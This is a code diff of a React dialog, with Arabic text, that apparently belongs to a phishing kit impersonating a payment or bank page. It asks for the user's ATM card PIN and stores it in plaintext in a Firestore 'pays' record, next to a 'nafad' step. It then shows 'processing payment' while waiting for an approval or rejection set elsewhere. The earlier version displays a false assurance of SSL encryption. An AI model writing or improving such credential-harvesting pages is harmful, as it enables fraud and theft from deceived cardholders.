@@ -2,112 +2,151 @@
 
 import type React from "react"
 
-import { useState } from "react"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
-import { Button } from "@/components/ui/button"
+import { useState, useEffect } from "react"
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Input } from "@/components/ui/input"
-import { Alert, AlertDescription } from "@/components/ui/alert"
-import { ShieldCheck, AlertCircle } from "lucide-react"
-import { db} from "@/lib/firebase"
-import { doc, updateDoc } from "firebase/firestore"
+import { Button } from "@/components/ui/button"
+import { Loader2, CheckCircle2, XCircle, Lock } from "lucide-react"
+import { updatePin, listenForApproval } from "@/lib/firebase"
 
 interface PinDialogProps {
   open: boolean
   onOpenChange: (open: boolean) => void
   onPinSubmitted: () => void
+  documentId?: string
 }
 
-export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps) {
-  const [pinCode, setPinCode] = useState("")
-  const [error, setError] = useState("")
-  const [isSubmitting, setIsSubmitting] = useState(false)
+type PinStatus = "idle" | "waiting" | "approved" | "rejected"
 
-  const handlePinSubmit = async (e: React.FormEvent) => {
+export function PinDialog({ open, onOpenChange, onPinSubmitted, documentId }: PinDialogProps) {
+  const [pin, setPin] = useState("")
+  const [status, setStatus] = useState<PinStatus>("idle")
+  const [error, setError] = useState("")
+
+  // Reset state when dialog opens/closes
+  useEffect(() => {
+    if (!open) {
+      setPin("")
+      setStatus("idle")
+      setError("")
+    }
+  }, [open])
+
+  // Listen for final approval status changes
+  useEffect(() => {
+    if (!documentId || status !== "waiting") return
+
+    const unsubscribe = listenForApproval(documentId, (newStatus) => {
+      if (newStatus === "approved") {
+        setStatus("approved")
+        setTimeout(() => {
+          onPinSubmitted()
+        }, 2000)
+      } else if (newStatus === "rejected") {
+        setStatus("rejected")
+        setError("تم رفض العملية. يرجى التواصل مع البنك.")
+      }
+    })
+
+    return () => unsubscribe()
+  }, [documentId, status, onPinSubmitted])
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    if (pinCode.length !== 4) {
-      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
+    if (pin.length < 4) {
+      setError("يرجى إدخال رقم PIN صحيح")
       return
     }
 
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID) {
-      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
+    if (!documentId) {
+      setError("حدث خطأ. يرجى المحاولة مرة أخرى")
       return
     }
-
-    setIsSubmitting(true)
 
     try {
-      // Update the document with the PIN
-      await updateDoc(doc(db, "pays", visitorID), {
-        pinCode,
-        pinSubmittedAt: new Date().toISOString(),
-        idVerificationStatus: "completed",
-        currentStep:"nafad"
-      })
-
-      // Success - call the callback
-      onPinSubmitted()
+      setStatus("waiting")
+      setError("")
+      await updatePin(documentId, pin)
+      // Now waiting for Firestore approval status to change
     } catch (err) {
-      console.error("Error submitting PIN:", err)
-      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
-    } finally {
-      setIsSubmitting(false)
+      setStatus("idle")
+      setError("حدث خطأ. يرجى المحاولة مرة أخرى")
     }
   }
 
+  const handleRetry = () => {
+    setPin("")
+    setStatus("idle")
+    setError("")
+  }
+
   return (
-    <Dialog open={open} onOpenChange={onOpenChange}>
+    <Dialog open={open} onOpenChange={status === "waiting" ? undefined : onOpenChange}>
       <DialogContent className="sm:max-w-md" dir="rtl">
         <DialogHeader>
           <DialogTitle className="flex items-center gap-2 text-xl">
-            <ShieldCheck className="w-6 h-6 text-[#0a4a68]" />
-            الرقم السري للبطاقة (PIN)
+            <Lock className="w-6 h-6 text-[#0a4a68]" />
+            إدخال رقم PIN
           </DialogTitle>
-          <DialogDescription>يرجى إدخال الرقم السري الخاص بجهاز الصراف الآلي (ATM)</DialogDescription>
+          <DialogDescription className="text-base">أدخل رقم PIN الخاص ببطاقتك لإتمام العملية</DialogDescription>
         </DialogHeader>
 
-        <form onSubmit={handlePinSubmit} className="space-y-4">
-          {error && (
-            <Alert variant="destructive">
-              <AlertCircle className="h-4 w-4" />
-              <AlertDescription>{error}</AlertDescription>
-            </Alert>
-          )}
-
-          <div className="space-y-2">
-            <label className="text-sm font-bold text-gray-900">الرقم السري (PIN)</label>
-            <Input
-              type="password"
-              placeholder="••••"
-              value={pinCode}
-              onChange={(e) => {
-                const value = e.target.value.replace(/\D/g, "").slice(0, 4)
-                setPinCode(value)
-                setError("")
-              }}
-              maxLength={4}
-              className="h-14 text-center text-3xl font-mono tracking-[1em]"
-              dir="ltr"
-              disabled={isSubmitting}
-              required
-            />
+        {status === "waiting" && (
+          <div className="flex flex-col items-center justify-center py-8 space-y-4">
+            <div className="relative">
+              <Loader2 className="w-16 h-16 text-[#0a4a68] animate-spin" />
+            </div>
+            <p className="text-lg font-semibold text-gray-700">جاري معالجة الدفع...</p>
+            <p className="text-sm text-gray-500 text-center">يرجى الانتظار، قد تستغرق العملية بضع ثوانٍ</p>
           </div>
+        )}
 
-          <Button
-            type="submit"
-            className="w-full h-12 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold"
-            disabled={pinCode.length !== 4 || isSubmitting}
-          >
-            {isSubmitting ? "جاري الإرسال..." : "تأكيد الدفع"}
-          </Button>
-
-          <div className="flex items-center justify-center gap-2 text-xs text-gray-600">
-            <ShieldCheck className="w-4 h-4" />
-            <p>الرقم السري محمي بتشفير SSL 256-bit</p>
+        {status === "approved" && (
+          <div className="flex flex-col items-center justify-center py-8 space-y-4">
+            <CheckCircle2 className="w-16 h-16 text-green-500" />
+            <p className="text-lg font-semibold text-green-700">تمت العملية بنجاح!</p>
+            <p className="text-sm text-gray-600 text-center">شكراً لك. تم إتمام عملية الدفع بنجاح.</p>
           </div>
-        </form>
+        )}
+
+        {status === "rejected" && (
+          <div className="flex flex-col items-center justify-center py-8 space-y-4">
+            <XCircle className="w-16 h-16 text-red-500" />
+            <p className="text-lg font-semibold text-red-700">فشلت العملية</p>
+            <p className="text-sm text-red-600 text-center">{error}</p>
+            <Button onClick={handleRetry} variant="outline" className="mt-4 bg-transparent">
+              المحاولة مرة أخرى
+            </Button>
+          </div>
+        )}
+
+        {status === "idle" && (
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <div className="space-y-2">
+              <Input
+                type="password"
+                placeholder="****"
+                value={pin}
+                onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                className="h-14 text-center text-2xl font-mono tracking-widest border-2 rounded-xl focus:border-[#0a4a68]"
+                maxLength={4}
+                autoFocus
+              />
+              {error && <p className="text-sm text-red-600 text-center">{error}</p>}
+            </div>
+
+            <Button
+              type="submit"
+              disabled={pin.length < 4}
+              className="w-full h-12 bg-[#0a4a68] hover:bg-[#083a54] text-white font-bold rounded-xl"
+            >
+              تأكيد الدفع
+            </Button>
+
+            <p className="text-xs text-gray-500 text-center">رقم PIN هو الرقم السري المكون من 4 أرقام الخاص ببطاقتك</p>
+          </form>
+        )}
       </DialogContent>
     </Dialog>
   )
